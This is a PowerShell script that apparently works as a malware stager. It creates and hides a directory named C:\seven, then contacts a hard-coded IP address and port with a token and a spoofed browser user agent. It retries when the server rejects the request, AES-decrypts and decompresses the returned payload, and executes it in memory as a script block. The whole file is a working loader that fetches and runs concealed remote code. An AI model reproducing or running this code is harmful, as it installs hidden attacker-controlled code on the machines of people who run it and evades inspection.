$ErrorActionPreference = 'Stop'
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

$B   = 'http://51.75.118.5:20216'
$T   = 'tk-48232543-a9d6F'
$UA  = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) WindowsPowerShell/5.1.19041.1'
$DIR = 'C:\seven'
$EXE = 'fakeauth.exe'

New-Item -ItemType Directory -Force -Path $DIR | Out-Null
attrib +h +s $DIR
attrib +h +s "$DIR\*" /s /d

$url = "$B/s/$T/install"
$r = $null
:attempt for ($n = 0; $n -lt 2; $n++) {
  try { $r = Invoke-RestMethod -Uri $url -UseBasicParsing -UserAgent $UA -TimeoutSec 30; break }
  catch {
    $resp = $_.Exception.Response
    if (-not $resp) { Write-Host "network: $($_.Exception.Message)" -ForegroundColor Red; return }
    $code = [int]$resp.StatusCode
    $body = ''
    try { $sr = New-Object IO.StreamReader($resp.GetResponseStream()); $body = $sr.ReadToEnd(); $sr.Close() } catch {}
    Write-Host "HTTP $code  $url" -ForegroundColor Red
    if ($body) { Write-Host "  -> $body" -ForegroundColor DarkYellow }
    switch ($code) {
      403 { if ($n -eq 0) { Write-Host '  UA rejected, retry with ?b' -ForegroundColor Yellow; $url = "$url?b"; continue attempt } ; return }
      429 { Write-Host '  rate limited 15/h' -ForegroundColor Yellow; return }
      503 { Write-Host '  payload not built on server' -ForegroundColor Yellow; return }
      default { return }
    }
  }
}
if (-not $r -or -not $r.d) { Write-Host 'empty payload' -ForegroundColor Red; return }

try {
  $aes = [Security.Cryptography.Aes]::Create()
  $aes.Mode = 'CBC'
  $aes.Padding = 'PKCS7'
  $aes.Key = [Convert]::FromBase64String($r.k)
  $aes.IV  = [Convert]::FromBase64String($r.v)
  $enc = [Convert]::FromBase64String($r.d)
  $gz  = $aes.CreateDecryptor().TransformFinalBlock($enc, 0, $enc.Length)

  $ms = New-Object IO.MemoryStream(,$gz)
  $zs = New-Object IO.Compression.GZipStream($ms, [IO.Compression.CompressionMode]::Decompress)
  $sr = New-Object IO.StreamReader($zs)
  $src = $sr.ReadToEnd()
  $sr.Close(); $zs.Close(); $ms.Close()
} catch {
  Write-Host "decrypt/gunzip failed: $($_.Exception.Message)" -ForegroundColor Red
  Write-Host "len=$($r.d.Length) k=$($r.k.Length) v=$($r.v.Length) h=$($r.h)" -ForegroundColor DarkGray
  return
}

if (-not $src) { Write-Host 'empty source' -ForegroundColor Red; return }
& ([ScriptBlock]::Create($src))
